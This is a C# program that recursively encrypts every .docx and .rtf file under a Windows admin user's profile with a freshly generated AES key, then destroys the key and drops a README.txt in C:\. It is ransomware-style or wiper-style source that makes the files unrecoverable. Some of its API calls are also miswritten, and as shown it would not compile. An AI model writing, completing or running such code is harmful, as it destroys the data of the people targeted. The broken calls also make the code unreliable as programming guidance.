using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FileEncryption
{
    public static class FileEncryptor
    {
        private const int CALG_AES_128 = 0x0000660e;
        private const int CRYPT_EXPORTABLE = 0x00000001;

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, IntPtr pbData, ref int pdwDataLen, int dwBufLen);

        public static void EncryptFiles(string directoryPath)
        {
            IntPtr hProvider = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;

            try
            {
                // Create a new AES-128 key
                if (!CryptAcquireContext(out hProvider, null, null, 1, 0))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                if (!CryptGenKey(hProvider, CALG_AES_128, CRYPT_EXPORTABLE, out hKey))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                // Encrypt files in the directory
                string[] fileExtensions = { ".docx", ".rtf" };

                foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
                {
                    string extension = Path.GetExtension(file);

                    if (Array.IndexOf(fileExtensions, extension) >= 0)
                    {
                        EncryptFile(file, hKey);
                    }
                }

                // Create README.txt file
                string readmePath = Path.Combine("C:\\", "README.txt");
                File.WriteAllText(readmePath, "done");
            }
            finally
            {
                if (hKey != IntPtr.Zero)
                {
                    CryptDestroyKey(hKey);
                }

                if (hProvider != IntPtr.Zero)
                {
                    CryptReleaseContext(hProvider, 0);
                }
            }
        }

        private static void EncryptFile(string filePath, IntPtr hKey)
        {
            using (FileStream fileStream = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
            {
                using (MemoryMappedFile mmf = MemoryMappedFile.CreateFromFile(fileStream, null, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                {
                    using (MemoryMappedViewAccessor accessor = mmf.CreateViewAccessor())
                    {
                        long length = accessor.Capacity;
                        byte[] data = new byte[length];
                        accessor.ReadArray(0, data, 0, data.Length);

                        CryptEncrypt(hKey, IntPtr.Zero, true, 0, data, ref data.Length, data.Length);

                        accessor.WriteArray(0, data, 0, data.Length);
                    }
                }
            }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CryptDestroyKey(IntPtr hKey);
    }
    public static class Program
    {
        public static void Main()
        {
           string directoryPath = @"C:\Users\domain.admin";

            try
            {
                FileEncryptor.EncryptFiles(directoryPath);
                Console.WriteLine("Encryption complete.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Encryption failed: " + ex.Message);
            }
        }
    }
}
